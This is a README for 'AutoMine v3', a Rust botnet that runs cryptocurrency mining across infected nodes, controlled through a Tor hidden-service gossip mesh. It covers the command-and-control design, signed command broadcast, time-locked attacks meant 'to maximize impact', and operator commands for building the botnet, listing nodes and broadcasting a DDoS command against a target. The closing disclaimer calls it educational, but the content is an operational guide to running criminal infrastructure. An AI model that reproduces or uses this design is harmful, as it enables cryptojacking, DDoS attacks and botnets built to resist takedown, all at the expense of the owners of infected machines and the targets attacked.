# AutoMine Mesh: Anonymous Tor P2P Swarm

> **STATUS**: ACTIVE
> **VERSION**: 3.0 (Tor Mesh P2P)
> **ARCHITECTURE**: Decentralized Onion Mesh
> **VISIBILITY**: INVISIBLE (Tor Hidden Services)

## 1. System Overview

AutoMine v3 is an evolved, fully decentralized botnet architecture designed for absolute anonymity and resilience. It abandons traditional TCP/IP command structures in favor of a **Tor Hidden Service P2P Mesh**.

-   **No Public IPs**: All communication occurs within the Tor Darknet (.onion).
-   **No Central Server**: The network is a self-healing mesh. Even if the Bootstrap node is taken down, existing peers maintain connectivity.
-   **Unstoppable Propagation**: Commands leverage a **Gossip Protocol** with exponential fanout.

## 2. The Trinity Architecture

### 👻 Ghost (Command Injector)
-   **Role**: Transient Authority.
-   **Behavior**: Stateless. Connects to the Mesh via Tor, injects a Signed Payload, and vanishes.
-   **Security**: Holds the "God Key" (Ed25519). Never accepts inbound connections.

### 🧅 Bootstrap (Onion Tracker)
-   **Role**: Introduction Point (Registry).
-   **Behavior**: A highly available Tor Hidden Service that maps Public Keys to current `.onion` addresses.
-   **Privacy**: **Metadata Only**. It stores *who* is online, but *never* sees command data (E2EE) and *never* relays traffic. It strictly facilitates initial peer discovery.

### �️ Node (The Hybrid Warrior)
-   **Role**: Worker & Router.
-   **Connectivity - Split Tunneling**:
    -   **C2 (Control)**: Listens on a unique Tor Hidden Service for P2P Gossip.
    -   **Mining (Data)**: connects directly to pools via Clearnet (TCP) for maximum hashrate performance.
-   **Gossip Logic**:
    -   **Fanout**: Forwards received commands to 30% of random neighbors.
    -   **Deduplication**: UUID-based tracking prevents loops.
    -   **Time-Lock**: Commands execute simultaneously across the globe based on a synchronized timestamp (`ExecuteAt`).

---

## 3. Protocol & Security

### 🔐 Tor Native Encryption
-   The entire transport layer is authenticated and encrypted by **Tor V3 Onion Services**.
-   **Anonymity**: Traffic analysis is mathematically infeasible.

### �️ Application Layer Security
-   **Ed25519 Signatures**: Every command is signed by the Ghost. Nodes verify signatures before propagating.
-   **Replay Protection**: UUID + Local LRU Cache.
-   **Time-Locked Execution**: Commands can be scheduled ("Attack at 10:00 UTC") to maximize impact.

---

## 4. Usage Guide

### �️ One-Step Build
Use the unified generator script to compile the toolchain, generate identities, and inject keys.

```bash
./scripts/generate.sh
```
*Outputs: `target/release/ghost`, `target/release/node`, `keys/ghost.key`*

### 📡 Deploy Bootstrap
(Optional: Required for new nodes to find the mesh)
```bash
./target/release/bootstrap
# Output: Listening on 127.0.0.1:8080 (Mapped to Tor HS 80)
```

### 🎮 Ghost Control (Operator)

**1. List Active Nodes:**
```bash
./target/release/ghost list --bootstrap "ws://bootstrap_onion_address"
```

**2. Broadcast Gossip (Global Command):**
```bash
./target/release/ghost broadcast \
  --bootstrap "ws://bootstrap_onion_address" \
  --key "keys/ghost.key" \
  --cmd "ddos:target.com"
```
*The command will infect the entry node and propagate via Gossip to the entire mesh.*

---

## 5. Technical Stack

-   **Language**: Rust (2024 Edition).
-   **Tor Integration**: `arti` (Official Rust Tor Implementation).
-   **Crypto**: `ed25519-dalek`, `uuid` v4.
-   **Async**: `tokio`, `futures`.

---

> **⚠️ EDUCATIONAL USE ONLY**: This software is designed for red-teaming and research into decentralized network resilience. The author is not responsible for misuse.
